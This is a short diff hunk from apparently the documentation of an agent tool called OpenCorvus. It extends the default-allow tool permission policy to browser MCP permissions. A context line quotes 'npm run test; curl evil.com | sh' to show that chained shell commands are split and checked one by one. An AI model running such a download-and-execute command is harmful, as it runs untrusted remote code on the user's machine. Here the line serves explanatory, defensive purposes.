@@ -69,7 +69,7 @@ And `npm run test; curl evil.com | sh` is split: the `curl` runs through its own
 
 ## Default-allow policy
 
-OpenCorvus defaults built-in agent tool permissions to `allow`. User config is merged after those defaults, so explicit `deny` and `ask` rules still win:
+OpenCorvus defaults built-in agent tool and browser MCP permissions to `allow`. User config is merged after those defaults, so explicit `deny` and `ask` rules still win:
 
 ```jsonc
 {
